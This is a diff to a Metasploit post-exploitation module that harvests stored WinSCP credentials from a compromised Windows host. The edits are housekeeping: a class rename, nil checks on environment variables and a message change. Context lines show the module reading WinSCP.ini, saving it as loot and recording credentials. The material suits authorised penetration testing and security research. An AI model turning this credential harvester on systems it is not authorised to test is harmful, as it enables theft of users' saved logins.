@@ -1,15 +1,13 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'rex/parser/ini'
 require 'rex/parser/winscp'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -114,6 +112,14 @@ class Metasploit3 < Msf::Post
     end
     env = get_envs('APPDATA', prog_files_env, 'USERNAME')
 
+    if env['APPDATA'].nil?
+      fail_with(Failure::Unknown, 'Target does not have environment variable APPDATA')
+    elsif env[prog_files_env].nil?
+      fail_with(Failure::Unknown, "Target does not have environment variable #{prog_files_env}")
+    elsif env['USERNAME'].nil?
+      fail_with(Failure::Unknown, 'Target does not have environment variable USERNAME')
+    end
+
     user_dir = "#{env['APPDATA']}\\..\\.."
     user_dir << "\\.." if user_dir.include?('Users')
 
@@ -137,7 +143,7 @@ class Metasploit3 < Msf::Post
     print_good("WinSCP.ini located at #{file_path}")
     file = read_file(file_path)
     stored_path = store_loot('winscp.ini', 'text/plain', session, file, 'WinSCP.ini', file_path)
-    print_status("WinSCP saved to loot: #{stored_path}")
+    print_good("WinSCP saved to loot: #{stored_path}")
     parse_ini(file).each do |res|
       winscp_store_config(res)
     end
@@ -181,5 +187,4 @@ class Metasploit3 < Msf::Post
 
     create_credential_login(login_data)
   end
-
 end
